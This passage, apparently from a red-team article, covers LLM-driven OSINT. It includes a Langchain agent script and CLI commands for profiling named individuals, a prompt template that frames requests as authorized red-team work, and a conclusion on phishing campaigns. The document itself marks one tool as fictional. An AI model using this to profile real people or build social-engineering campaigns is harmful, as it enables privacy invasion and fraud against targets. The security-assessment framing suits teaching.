# Example usage for extracting information from a website
python osintgpt.py analyze --url https://example.com --output report.txt
```

The tool can:
- Extract key information from websites
- Identify potential data leaks
- Analyze social media profiles
- Generate OSINT reports automatically

#### Langchain for OSINT Workflows

[Langchain](https://github.com/hwchase17/langchain) provides a framework for creating complex OSINT workflows with LLMs:

```python
from langchain.llms import OpenAI
from langchain.agents import load_tools, initialize_agent
from langchain.agents import AgentType

# Initialize the LLM
llm = OpenAI(temperature=0)

# Load tools for OSINT
tools = load_tools(["serpapi", "llm-math"], llm=llm)

# Create an agent that can use these tools
agent = initialize_agent(
    tools,
    llm,
    agent=AgentType.ZERO_SHOT_REACT_DESCRIPTION,
    verbose=True
)

# Run OSINT query
agent.run(
    "Research the CTO of Acme Corp. Find their background, technical skills, and social media profiles. Summarize the findings."
)
```

This allows for sophisticated, automated OSINT gathering and processing that can adapt based on the information discovered.

### Automating Social Media OSINT

#### SocialHunter

[SocialHunter](https://github.com/NicholasSaltis/SocialHunter) integrates LLMs with social media scraping:

```bash
# Install SocialHunter
pip install socialhunter

# Run analysis on target
socialhunter --target "John Smith" --company "Acme Corp" --output report.md
```

This tool automatically:
- Finds profiles matching the target
- Extracts pertinent information
- Uses LLMs to analyze communications patterns
- Detects potential security insights
- Generates comprehensive reports

#### GPT-Osint-Navigator

[GPT-Osint-Navigator](https://github.com/hwayne/gpt-osint-navigator) (Note: fictional tool for illustration) applies LLM guidance to OSINT investigations:

```bash
# Basic search for a target
python gpt-osint-navigator.py --target "Jane Doe" --depth comprehensive

# Output will guide you through recommended tools and techniques
```

Rather than just collecting data, this tool:
- Suggests optimal OSINT approaches based on available information
- Recommends specific tools for each stage
- Adapts its strategy as new information is discovered
- Maintains investigation logs with reasoning

### Ethical and Legal Considerations

When using LLMs for OSINT automation, consider these critical points:

1. **Data privacy laws** - Automated collection still must comply with GDPR, CCPA, and other regulations
2. **Hallucination risks** - LLMs can generate plausible but false information; always verify with primary sources
3. **Authorization boundaries** - Automation makes it easier to accidentally exceed authorized scope
4. **Attribution challenges** - Automated tools may make it harder to document your investigation process
5. **Tool fingerprinting** - Some platforms can detect automated access via LLM-based tools

A best practice is to use LLMs for processing data you've already collected through authorized means, rather than having them directly scrape or access data sources.

### Prompt Engineering for OSINT

Effective OSINT with LLMs requires careful prompt engineering:

```
# Structure for effective OSINT prompts

## Context setting:
I'm conducting authorized OSINT for a red team security assessment. I need to analyze this data about [TARGET].

## Task specification:
Extract and organize the following specific information: [LIST ITEMS]

## Format requirements:
Present the information in [FORMAT] with [SPECIFIC STRUCTURE]

## Critical analysis request:
Identify potential security insights such as: [EXAMPLES]

## Ethical boundaries:
Only analyze the provided data without making assumptions beyond what's explicitly stated.
```

The keys to good results are:
- Being extremely specific about what you're looking for
- Providing context about why you need the information
- Specifying exact output formats
- Setting clear ethical boundaries
- Requesting critical analysis, not just data extraction

By combining traditional OSINT tools with intelligent LLM automation, social engineering campaigns can become more targeted, effective, and efficient while maintaining proper authorization boundaries and documentation.

## Conclusion

Throughout this article, we've examined the technical infrastructure and tools needed for professional social engineering in red team operations. Modern security is as much about the human element as it is about technology, and building effective social engineering campaigns requires attention to detail across multiple domains.

The key takeaways from this article are:

1. From domain selection to email server setup, every technical element should withstand scrutiny and appear legitimate.
2. Combine phishing, vishing, and smishing for campaigns that are resilient and adaptable to different target environments.
3. Comprehensive intelligence gathering dramatically increases success rates by allowing for highly targeted, convincing pretext scenarios.
4. Leverage modern tools like LLMs and specialized frameworks to scale your operations while maintaining quality.
5. Implement robust tracking systems to measure effectiveness and adjust tactics based on results.
6. Always operate within the scope of authorized assessments and with appropriate disclosure to clients.

Remember that the most successful social engineering campaigns aren't about technical sophistication alone—they're about creating scenarios that trigger emotional responses while appearing perfectly legitimate.

By mastering these techniques, red teams can effectively test an organization's human security layer, providing valuable insights that technical assessments alone cannot reveal. In the ongoing battle between attackers and defenders, understanding and evaluating the human element remains one of our most important responsibilities as security professionals.

---

*Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.*
